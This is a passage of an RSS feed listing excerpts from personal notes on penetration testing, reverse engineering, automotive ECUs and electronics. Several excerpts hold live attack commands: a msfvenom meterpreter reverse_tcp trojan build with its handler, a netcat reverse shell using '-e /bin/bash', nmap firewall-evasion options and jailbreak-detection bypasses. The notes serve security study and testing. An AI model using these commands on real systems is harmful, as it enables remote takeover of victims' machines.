Two type of bulbs (both ending with orange wires) T1 14V/40mA or 14V/60mA (3x6mm) T1 1/4 14V/80mA ~ equates to 1.</description></item><item><title>ECU Calibration</title><link>https://duraki.github.io/notes/ecu-calibration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ecu-calibration/</guid><description>ECU tuning is a part of Calibration Changing some values to make a vehicle faster, have better accelaration etc. This calibration process is used to fine tune all parameters before final manufacturing process Usually XCP interface is removed from final production If XCP is open, you still need to reverse the firmware to understand the ECU How to Calibrate and Adjust Calibration Software Vehicle networks Interface to the ECU Calibration Protocol ECU description file (*.</description></item><item><title>ECU Foundations</title><link>https://duraki.github.io/notes/ecu-foundations/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ecu-foundations/</guid><description>ECU Electronic Control Unit the &amp;ldquo;ECU&amp;rdquo; Doing calculations or apply rules in the vehicle system Calculation example of ECU Meassure &amp;ldquo;Speed (km/h)&amp;rdquo; ECU would &amp;ldquo;calculate&amp;rdquo;: - speed (km/h) = wheel (rpm) x 3.6 Apply a tiny part of logic If speed is above 5km/h, then lock the doors ECUs are wired to sensors, mothers, and other actuators One ECU can be used for different vehicles They use microcontroller (have memory/storage unlike microprocessor) Uses embedded software, via special hardware that converts electrical signal to numbers (and vice-versa), collectively IO (input/output) Uses networking hardware, via in-vehicle networks (like CANBus) ECU Software Layers</description></item><item><title>Electronic Signals</title><link>https://duraki.github.io/notes/electronic-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/electronic-signals/</guid><description>Quick-jump to AC and DC Signals
Purpose of Electronic Signals Electronic Signals move information like cars move passenger down the highway Signals allow devices (e.g. sensors, or switches) to communicate with Control Modules Such communication can be completed via simple Relays Other times, the communication requires a complicated processor Signals and the modules perform or request (through more signaling) other functions to be carried out Example of Signals</description></item><item><title>Enable SSH on Raspbian OS</title><link>https://duraki.github.io/notes/enable-ssh-on-raspbian-os/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/enable-ssh-on-raspbian-os/</guid><description>Via RO/RW SD Card This seems to work only on Raspbian OS, and not the custom GNU/Linux ARM builds-. To enable SSH on boot, you need to create a new ssh file in your SD Card&amp;rsquo;s /boot partition:
First, make sure to mount the boot partition, as seen on Mounting SBC Operating System.
Next, create the ssh file:
$ sudo touch /Volumes/boot/ssh Paswordless SSH Authentication In your Raspberry OS, do the following to generate ~/.</description></item><item><title>Encryption and Cryptography</title><link>https://duraki.github.io/notes/encryption-and-cryptography/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/encryption-and-cryptography/</guid><description>Quick Decode(s) For JWT use jwt.io, paste your token and enjoy formatted results When having base64 encoded string, simply: echo &amp;quot;&amp;lt;string&amp;gt;&amp;quot; | base64 --decode. When having md5 or equivalent (one-way hash), use hashcat Decoding Unknown Chipers To decode unknown chipers, you will need to take the binary that engages on the encryption/decryption mechanism, and understand the logic flow. It&amp;rsquo;s similar to when you are bypassing a license, except the figurative data is usually hard to understand.</description></item><item><title>Ethernet Specifications</title><link>https://duraki.github.io/notes/ethernet-specifications/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ethernet-specifications/</guid><description>Specifications SomeIP, Ethernet, IP Stack New standard 10BASE-T1S 10Mbit/s Half-duplex PLCA bus cycle - only specific PHY that can send data Physical Layer Collision Avoidance (PLCA) Avoid collision of data Multiple applications on single cable</description></item><item><title>Firewall Engagements</title><link>https://duraki.github.io/notes/firewall-engagements/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/firewall-engagements/</guid><description>Reconned from the start to finish in a few sec &amp;hellip;
┌──(kali㉿kali)-[~] └─$ ping x.x.x.x PING ??? 56(84) bytes of data. 64 bytes from ???: icmp_seq=1 ttl=52 time=64.4 ms 64 bytes from ???: icmp_seq=2 ttl=52 time=62.7 ms ^C --- ??? ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1002ms ┌──(kali㉿kali)-[~] └─$ host x.x.x.x % nslookup &amp;gt; set type=PTR &amp;gt; x.x.x.x Server: ??? Address: ??? Non-authoritative answer: .</description></item><item><title>Frida &amp; Objection Tutorial</title><link>https://duraki.github.io/notes/frida-objection-tutorial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/frida-objection-tutorial/</guid><description>Android Tutorial Frida Setup Make sure to have Android Debugging interface running (adbd) on your testing device. For reference, read the adbd setup first and then continue here.
Install the Frida for Android:
$ adb root # might be required $ adb push frida-server /data/local/tmp/ $ adb shell &amp;#34;chmod 755 /data/local/tmp/frida-server&amp;#34; $ adb shell &amp;#34;/data/local/tmp/frida-server &amp;amp;&amp;#34; Smoke test on Frida setup:
$ adb devices -l $ frida-ps -U # PID NAME 1590 com.</description></item><item><title>Frida Gadget Injection</title><link>https://duraki.github.io/notes/frida-gadget-injection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/frida-gadget-injection/</guid><description>This is quick description on how to inject Frida gadget into Smali directly without much overhead. Start by installing Frida and Objection and then continuing from here.
First decompile the APK and check the AndroidManifest.xml file.
$ more AndroidManifest.xml &amp;lt;application ...&amp;gt; &amp;lt;activity android:name=&amp;#34;xxx.activity.SplashActivity&amp;#34; android:noHistory=&amp;#34;true&amp;#34; android:screenOrientation=&amp;#34;portrait&amp;#34;&amp;gt; ... Write down the Activity name (such is SplashActivity). Must be somewhere on early start-up of application lifecycle. Open up the Activity in decompiled Smali object, and change the public constructor &amp;lt;init&amp;gt;(V) to include frida-gadget.</description></item><item><title>Frida Gadget Injection on iOS</title><link>https://duraki.github.io/notes/frida-gadget-injection-on-ios/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/frida-gadget-injection-on-ios/</guid><description>Here, I will explain quickly how to patch IPA with Frida Gadget, usable for iOS, and iPadOS operating systems.
Provision of Apple Certificate
Create a new Apple Developer Account (Free), or use Apple Paid Developer Account ($99) this works even if your Apple Device (iPhone, iPad) is not iCloud synced to newly created account Login to Apple Developer account in XCode via Preferences -&amp;gt; Account Create a blank iOS app.</description></item><item><title>Frida Trace for iOS</title><link>https://duraki.github.io/notes/frida-trace-for-ios/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/frida-trace-for-ios/</guid><description>You can imagine application as a black box that interacts with the outer world via inputs and outputs. Ordinary mobile application has specific threat model. Particularly, filesystem and network communication are pretty interesting interaction points which can give you a lot of useful information.
Using frida-discover to get some idea where to start
$ frida-discover -U com.iosapp.example # libcommonCrypto.dylib # Calls Function # 15 sub_bec0 # 15 sub_bee4 # 8 sub_96f8 # 8 sub_befc # 3 CCDigest Using frida-trace to find NSURLSession tasks</description></item><item><title>Ghidra and Related</title><link>https://duraki.github.io/notes/ghidra-and-related/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ghidra-and-related/</guid><description>Installation Clone the repository or download and extract somewhere. In Ghidra, open the Script Manager (Window -&amp;gt; Script Manager) click the Script Directory button and add $REPO/scripts to the list.
Once the script directory is added to Ghidra you can find the scripts in the Script Manager. You can run the scripts directly from the Script Manager in Ghidra. Additionally, imported scripts can also have Menus entry, and assigned keyboard shortcuts for ease of use.</description></item><item><title>GMMK 60% Keyboard</title><link>https://duraki.github.io/notes/gmmk-60-keyboard/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/gmmk-60-keyboard/</guid><description>General Shortcuts, LED Shortcuts
General Shortcuts Shortcut Function Fn+W Adjust keyboard&amp;rsquo;s LED backlight brightness Fn+S Adjust keyboard&amp;rsquo;s LED backlight brightness Fn+Z Adjust LED backlight direction Fn+X Cycle through various backlight RGB colors Fn+A Adjust RGB LED light speed during animations Fn+D Adjust RGB LED light speed during animations Fn+R Press for 10 seconds to reset keyboard to factory default settings Fn+Win Enable / Disable Windows key Fn+Caps Lock Swap functions of Fn and Caps Lock.</description></item><item><title>Hall Effect Sensors</title><link>https://duraki.github.io/notes/hall-effect-sensors/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/hall-effect-sensors/</guid><description>Hall Effect Sensors can be used to produce ON/OFF signals or modulated square wave. It&amp;rsquo;s a type of DC Digital Sensors in DC Signals.
Hall Effect Sensors are electronic switches, that react to magnetic fields, to rapidly control the flow of current or voltage ON and OFF. It is assembled of epoxy filled non-magnetic housing, containing a hall element, a magnet, and a trigger wheel.
The Hall element is a thin, non-magnetic plate which is electrically conductive.</description></item><item><title>How to compromise ECU</title><link>https://duraki.github.io/notes/how-to-compromise-ecu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/how-to-compromise-ecu/</guid><description>Five steps to compromise ECU:
Remote access Access to in-vehicle network Bridge domain boundaries Access to target ECU Manipulate ECU or vehicle behavior Find more info about Car Hacking on notes.</description></item><item><title>How to write Notes</title><link>https://duraki.github.io/notes/how-to-write-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/how-to-write-notes/</guid><description>Use Markdown for everything, stand-alone deployment Use shortcodes, and develop custom ones Note: shortcodes are commented-out Note: correct syntax is {{&amp;lt;..&amp;gt;}} (no spaces between {} &amp;amp; &amp;lt;&amp;gt;) Clear and consistent, easy to implement new features Including Images To include images, copy the image to /content/posts/images/*. Then when you want to include it, use either of:
# =&amp;gt; like this ![Image Caption](/posts/images/image-of-choice.png) # =&amp;gt; or {{ &amp;lt; imgcap title=&amp;#34;Image Caption&amp;#34; src=&amp;#34;/posts/images/image-of-choice.</description></item><item><title>iOS Frida Scripting</title><link>https://duraki.github.io/notes/ios-frida-scripting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ios-frida-scripting/</guid><description>Before start, make sure you follow all of the typical iOS Reverse Engineering processes, as well as how to use lldb more professionally. The below Frida snippets will greatly increase your binary instrumentation knowledge.
Check if Objective-C Runtime is available
if (ObjC.available) { ... } Get Process ID (PID)
Process.id Get Process current Thread ID
Process.getCurrentThreadId() List all Classes
// Iterate through all classes Object.keys(ObjC.classes).forEach(function (className) { ... }); // Iterate through all classes via for-loop for (var className in ObjC.</description></item><item><title>iOS Reverse Engineering</title><link>https://duraki.github.io/notes/ios-reverse-engineering/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ios-reverse-engineering/</guid><description>Restart SpringBoard if iPhone crashed
$ killall SpringBoard $ killall -SIGSEGV SpringBoard ^ // Safe Mode Print iOS Logs from Terminal
$ tail -f /var/log/syslog Using class-dump, or dsdump
$ class-dump -S -s -H App -o /path/to/headers/App/ // old way $ dsdump App // new way Install offloaded *IPA files
# requires: # brew install libimobiledevice # brew install ideviceinstaller $ ideviceinstaller -i &amp;lt;path_to_ipa_file&amp;gt; frida-server crashing on iPhone device
If your frida-server is crashing on the iPhone test device, you can try to:</description></item><item><title>iOS Static Analysis</title><link>https://duraki.github.io/notes/ios-static-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ios-static-analysis/</guid><description>Watch iPhone device System Logs
$ idevicesyslog [connected] Nov 18 17:58:52 kernel[0] &amp;lt;Notice&amp;gt;: EXC_RESOURCE -&amp;gt; duetexpertd[37309] exceeded mem limit: InactiveHard 14 MB (fatal) Nov 18 17:58:52 kernel[0] &amp;lt;Notice&amp;gt;: duetexpertd[37309] Corpse allowed 1 of 5 Nov 18 17:58:52 backboardd(IOKit)[21224] &amp;lt;Notice&amp;gt;: Connection removed: IOHIDEventSystemConnection uuid:XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX pid:37309 process:duetexpertd type:Monitor entitlements:0x2 caller:AppPredictionInternal: &amp;lt;redacted&amp;gt; + 44 attributes:(null) state:0x1 events:14456 mask:0x1000 dropped:0 dropStatus:0 droppedMask:0x0 lastDroppedTime:NONE ... Inspect App. Bundle (Persisted Data)
// Compiled code, statically linked files, compressed NIBs, et al.</description></item><item><title>Jailbreak Bypass</title><link>https://duraki.github.io/notes/jailbreak-bypass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/jailbreak-bypass/</guid><description>Bypass Common iOS Jailbreak Bypasses
Libery Lite via Cydia, then go to iOS Settings, and select the application (Recommended) Objection use ios jailbreak disable or --startup-command Frida as a standalone instrumentation Cycript via REPL-based Dynamic Instrumentation Manual Patching, the old school way Detection Sandbox Integrity Check:
On iOS devices, user apps installed in /var/mobile/Application are restricted by the sandbox, while System Apps installed in /Application are not restricted by the sandbox.</description></item><item><title>Linux Notes</title><link>https://duraki.github.io/notes/linux-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/linux-notes/</guid><description>Active Directory
Access Active Directory Domain Admin via Linux:
$ sudo apt-get realmd $ realm join example.ba --user username</description></item><item><title>List of Tools</title><link>https://duraki.github.io/notes/list-of-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/list-of-tools/</guid><description>apktool, android, openssl</description></item><item><title>List of Topics</title><link>https://duraki.github.io/notes/list-of-topics/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/list-of-topics/</guid><description>Personal list of topics of interest. At least for me eh? :)
Automotive Cyber Security §Automotive Automotive Hacking Ethernet in Vehicles CANFD Specifications ECU Foundation ECU Calibration ECU Compromise Vehicle Graybox Security Testing Vehicle Hacking Environment Classical Penetration Testing §Classical Pentest OSINT Web Pentest Oneliners Web Fuzzing SQL Injection Payloads Cloud Metadata XSS Payloads Captcha Bypass 403 Bypass Virtual Host Enumeration API Abuse Checklists REST API Issue Library Web Issue Library PHP Source Code Analysis PHP Filesystem Functions Networking §Network Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks Reverse Engineering §RE Tricks and Tips WinDbg Cheatsheets Byteman Cheatsheets Byteman Scripts MacOS Reverse Engineering Ghidra and Related LLDB for MacOS Hopper for MacOS iOS Reverse Engineering Frida &amp;amp; Objection Tutorial Pure Reverse Engineering LLDB Cycript Decrypt IPA from AppStore iOS Jailbreak Bypass iOS Static Analysis Android Reverse Engineering Frida &amp;amp; Objection Tutorial Frida Gadget Injection on Android Android Recompilation OPCRouter Research Development §dev blog</description></item><item><title>lldb</title><link>https://duraki.github.io/notes/lldb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/lldb/</guid><description>Click Here if you are looking for iOS-specific lldb notes. Scroll below to see attaching errors and workaround.
Commands/Assistance chisel is a collection of LLDB commands to assist debugging iOS apps. swift_po substitutes po command for Swift, with edge cases avoidance. lldb-helpers is a collection of helpers for more precise breakpoints. Cheatsheet Objective-C Inject LOAD_DYLIB from LLDB &amp;ndash; load Cycript, or dylib of your choice
(lldb) po dlopen(&amp;#34;/usr/lib/test.dylib&amp;#34;, 1) Important &amp;ndash; set a lldb language context to Objective-C:</description></item><item><title>lldb for iOS</title><link>https://duraki.github.io/notes/lldb-for-ios/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/lldb-for-ios/</guid><description>Setup LLDB for iOS remote debugging
Install lldb on Host OS (MacOS), and all necessary USB debugging toolset.
$ brew install lldb libplist libusb ldid # ... $ brew install iproxy // tunnel ssh traffic to usb $ iproxy 2222 22 // will tunnel port/2222(usb) to port/22(ssh) $ iproxy 23999 22 // will tunnel port/23999(usb) to port/22(ssh) /** we are tunneling 2x ports because one will be used for */ /** iOS Device shell, and the second one, specifically for the */ /** lldb (debugserver) */ Sign the debugserver so that it can attach to iOS apps.</description></item><item><title>MacOS MITM on TCP/UDP</title><link>https://duraki.github.io/notes/macos-mitm-on-tcp/udp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/macos-mitm-on-tcp/udp/</guid><description>Configure your MacOS to point /etc/private/hosts to real server.
Next use the following script to print and return handlers.
## basic intercept tcp macos desktop via /etc/private/hosts def handle_request(message): print(message) return message + b&amp;#34;\x00&amp;#34; def handle_response(message): # Both functions must return a message. print(message) return message Run mitm_intercept.py with the following command line:
$ mitm_intercept.py -l u:x.x.x.x:port t:x.x.x.x.x:port -t u:x.x.x.x:port x.x.x.x:port -p x.x.x.x:8080
References:
via -l listener via u: &amp;amp; t: udp + tcp listener via -t target via -p proxy listener (burp) via -m (mix connection) performs TCP relay without SSL handshake In this case, the communication goes through the HTTP modification server running on 127.</description></item><item><title>MacOS Notes</title><link>https://duraki.github.io/notes/macos-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/macos-notes/</guid><description>Adding an application to Finder.app toolbar
Locate the app. in your /Application folder. Lets say you want to use OpenTerminal-Lite app. as a toolbar menu in Finder.
Locate the /Applications/OpenTerminal-Lite.app Use ⌘+⌥ on keyboard, and drag-and-drop the app to Finder.app toolbar Yup, thats it Hide a folder on MacOS (using an attribute)
$ chflags hidden /someones/desktop/folder Hide a symlink folder on MacOS
$ chflags -h hidden /someones/desktop/folder Check Application entitlement</description></item><item><title>MacOS Reverse Engineering</title><link>https://duraki.github.io/notes/macos-reverse-engineering/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/macos-reverse-engineering/</guid><description>It helps knowing more deep technical stuff for the overview of those notes. Besides, also take a look at: Ghidra, LLDB for MacOS, and Hopper for MacOS. Notes on dyld Injection are also handful for Mach-O RE tasks.
Accessing Logs on System Level To access the Host OS (MacOS) logs from the command line, the log command can be used.
# =&amp;gt; will log via default settings $ (sudo) log show --style syslog --predicate &amp;#39;process == &amp;#34;com.</description></item><item><title>Magnetoresistive Sensors</title><link>https://duraki.github.io/notes/magnetoresistive-sensors/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/magnetoresistive-sensors/</guid><description>This type of sensor is particulary suitable for advanced stability control applications, in which sensing at zero, or near zero speed is required.
A permanent magnet in the sensor produces a magnetic field, with the magnetic field stream at a right angle to the sensing element
The sensor element is ferromagnetic alloy. It changes its resistance based on the influence of magnetic fields.
If the high portion of the pulse wheel approaches the sensing element, a deflection of the magnetic field stream is created.</description></item><item><title>Metasploit Framework</title><link>https://duraki.github.io/notes/metasploit-framework/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/metasploit-framework/</guid><description>Create executable trojan
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.153.128 LPORT=8888 -o /root/Desktop/dolphin.exe On Attackers machine (Starting Session)
$ msfconsole ... [loaded] msf5 exploit(multi/handler) &amp;gt; use multi/handler msf5 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcp payload =&amp;gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &amp;gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &amp;#39;&amp;#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) &amp;gt; set LHOST 192.</description></item><item><title>Modding Uplink by Introversion</title><link>https://duraki.github.io/notes/modding-uplink-by-introversion/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/modding-uplink-by-introversion/</guid><description>Are you a modder? Do you want to learn how to make game modes and game hacks? You are at the right place. We will take Uplink as an example and explore various things, based on recollection of the source code. The source codes is visible at this link.
Changing the Uplink default Font Size for HDPI On MacOS, specifically when using 2K resolution or above, either via Retina or external display; the font size of Uplink interface becomes to small to read.</description></item><item><title>Modulated Square Wave Signals</title><link>https://duraki.github.io/notes/modulated-square-wave-signals/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/modulated-square-wave-signals/</guid><description>A Modulated Square Wave is a series of High/Low signals repeated rapidly.
.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; } A Modulated Square Wave appears as a High/Low signal, repeated rapidly over and over Like the switched signal B+ and B-, the square wave has only two voltage levels. These are: High Level and Low Level.</description></item><item><title>Mounting SD Cards</title><link>https://duraki.github.io/notes/mounting-sd-cards/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/mounting-sd-cards/</guid><description>MacOS Instructions The instructions below are only viable for MacOS based Host operating systems. For Linux, please refer to [/linux-notes].
Mounting ext4 Linux partition Check MacOS Notes for detailed instructions. todo: move the instructions in this document
Mounting boot partition Insert your SD Card in the Card Reader Open Terminal and enter following commands # =&amp;gt; if one fails, try the other one $ sudo mount /Volumes/boot -o remount,rw $ sudo mount -uw /Volumes/boot You should be able to write to boot partition now, ie.</description></item><item><title>netcat tricks</title><link>https://duraki.github.io/notes/netcat-tricks/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/netcat-tricks/</guid><description>Basic use of Netcat + CentOS Firewall Rules For direct reverse shell:
|attacker machine|&amp;lt;------&amp;gt;|victim machine| On &amp;ldquo;attackers machine&amp;rdquo; (vps, infra, blackhole), drop all iptables rules (dirty), and setup a connection listener:
$ sudo iptables -F $ sudo ncat -nlvp 9999 On &amp;ldquo;victim machine&amp;rdquo; (target), connect to netcat listener:
$ ncat x.x.x.x 9999 -e /bin/bash You should have a working remote shell n0w.
For probe direct reverse shell:
|attacker machine|&amp;lt;------&amp;gt;|attacker box|&amp;lt;-------&amp;gt;|victime machine| On &amp;ldquo;attackers box&amp;rdquo; (blackhole and/or owned boxes), drop all iptables rules (dirty), and setup a connection broker.</description></item><item><title>Network</title><link>https://duraki.github.io/notes/network/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/network/</guid><description> Basic Network Recon Firewall Penetration Test Wifi Cracking via Aircrack GSN3 Lab Environment Metasploit Framework Server Anywhere Netcat Tricks</description></item><item><title>Network Lab</title><link>https://duraki.github.io/notes/network-lab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/network-lab/</guid><description>Simple Topology In GSN3, add 2 VPCS and 2 Cisco routers. Start VPCS and enter Console mode. Append IPv4 address for the interface.
# sets ipv4; netmask and gw for the vpc PC1&amp;gt; ip 192.168.0.10/24 192.168.0.1 Checking for duplicate address... PC1 : 192.168.0.10 255.255.255.0 gateway 192.168.0.1 # ... same for the 2nd vpc with different static ip # PC2&amp;gt; ip 192.168.0.11/24 192.168.0.1 Always save the configuration of the assets with save command:</description></item><item><title>Network Recon</title><link>https://duraki.github.io/notes/network-recon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/network-recon/</guid><description>External Network Engagement nmap oneliners (do-it-all) + fw evasion
$ nmap -Pn -vvv -sC --script=firewalk -p1-65535 -D RND:10 &amp;lt;target&amp;gt; basic recon
$ nslookup set type=NS x.x.x.x basic nmap
$ sudo nmap -sS 80.101.121.42 # syn scan first $ sudo nmap -O 80.101.121.42 # os detection $ sudo nmap -sV -sS 80.101.121.42 -p 8089 # service detection $ nc 80.101.121.42 8089 # try connecting via detected ports basic masscan
$ sudo masscan 80.</description></item><item><title>Network Reverse Engineering</title><link>https://duraki.github.io/notes/network-reverse-engineering/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/network-reverse-engineering/</guid><description>using netstat (xnu) to print only TCP entries for a specific PID:
$ netstat -anvp tcp | awk &amp;#39;{ if ($9 == PID) print }&amp;#39; # =&amp;gt; ie. # $ netstat -anvp tcp | awk &amp;#39;{ if ($9 == 1105) print }&amp;#39; ## tcp4 0 0 192.168.0.25.52952 52.0.253.194.443 ESTABLISHED 131072 131072 1105 0 0x0102 0x00000000 ## tcp4 0 0 127.0.0.1.45112 *.* LISTEN 131072 131072 1105 0 0x0100 0x00000106 ## tcp4 0 0 127.</description></item><item><title>NTC Sensors</title><link>https://duraki.github.io/notes/ntc-sensors/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ntc-sensors/</guid><description>NTC (Negative Temperature Coefficient) sensors is a type of DC Analog Sensor which change resistance based on temperature.
When a temperature goes up, the resistance goes down. This decrease in resistance causes the voltage drop across the sensor to decrease. Therefore, the input signal voltage at the Control Module decreases.
.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.</description></item><item><title>OPCRouter Research</title><link>https://duraki.github.io/notes/opcrouter-research/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/opcrouter-research/</guid><description>OPC-Router.com Exploitation and Vulnearbility Research Supported Platforms:
OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126.exe**) Windows Server 2016 &amp;amp; 2012 R2 Windows 10 (also IoT) &amp;amp; 8.1 OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126 (Windows 7).exe**) Windows Server 2012 R1 &amp;amp; 2008 R2 Windows 8.0 &amp;amp; 7 What is OPC OLE for Process Control (OPC) is a set of standard interfaces based upon Microsoft&amp;rsquo;s OLE/COM technology. The application of the OPC standard interface makes possible interoperability between automation/control applications, field systems/devices etc.</description></item><item><title>OSINT</title><link>https://duraki.github.io/notes/osint/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/osint/</guid><description>Breach Compilation (1.4BILL)</description></item><item><title>PHP Filesystem Functions</title><link>https://duraki.github.io/notes/php-filesystem-functions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/php-filesystem-functions/</guid><description>Filesystem functions analysis as a part of PHP Source Code Analysis:
// open filesystem handler fopen tmpfile bzopen gzopen SplFileObject-&amp;gt;__construct // write to filesystem (partially in combination with reading) chgrp chmod chown copy file_put_contents lchgrp lchown link mkdir move_uploaded_file rename rmdir symlink tempnam touch unlink imagepng - 2nd parameter is a path. imagewbmp - 2nd parameter is a path. image2wbmp - 2nd parameter is a path. imagejpeg - 2nd parameter is a path.</description></item><item><title>PHP Source Code Analysis</title><link>https://duraki.github.io/notes/php-source-code-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/php-source-code-analysis/</guid><description>When looking at PHP applications and source code analysis process, one of the first things I grep and search for are for functions accepting $USER input with the potential to execute an external program or malform the input in some form or action:
Use this grep command
$ grep -nR &amp;#34;exec(&amp;#34; ./phpBB/ --include \*.*php* | more` Important Function
assert() create_function() eval() exec() Execution Operators (``) include() include_once() passthru() pcntl_exec() popen() preg_replace() (with `/e` modifier) proc_open() ReflectionFunction (class) require() require_once() shell_exec() system() Command Execution</description></item><item><title>Potentiometers</title><link>https://duraki.github.io/notes/potentiometers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/potentiometers/</guid><description>A Potentiometer produces a gradually changing voltage signal to a Control Module. The signal is infinitely variable, with-in the operating range of the sensor.
This varying voltage reflects a mechanical movement or position of the potentiometer internal arm and its related components.
.caption-wrapper { margin-bottom: 60px !important; } .caption { } .caption-wrapper .caption-text { display: block!important; text-align: left; font-style: italic; font-size: 12px; line-height: 1.1; padding-bottom: 20px; } Potentiometer - Signal internal flow Typical Application of Potentiometers Pedal Position Sensors Throttle Position Sensors Feedback Potentiometers &amp;hellip;</description></item><item><title>PTC Sensors</title><link>https://duraki.github.io/notes/ptc-sensors/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/ptc-sensors/</guid><description>PTC (Positive Temperature Coefficient) sensors is a type of DC Analog Sensor which change resistance based on temperature.
In a PTC sensor, as the temperature goes up, the resistance also goes up. The increase in resistance causes the voltage drop across the sensor to increase, and the input signal voltage at the Control Module increases.
When troubleshooting a faulty input display, the input signal must be verified as VALID before the Control Module is replaced.</description></item><item><title>Pure Reverse Engineering</title><link>https://duraki.github.io/notes/pure-reverse-engineering/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://duraki.github.io/notes/pure-reverse-engineering/</guid><description>Some RE Tricks and Tips have been shared here. Otherwise, check references at the bottom of these notes.
Use Byteman to instrument compiled Java application and *.jar files. A sample script has been included in the notes.
Hopper Disassembler In case Hopper Disassembler is Not Responding (sometimes due to large binary/analysis), you can:
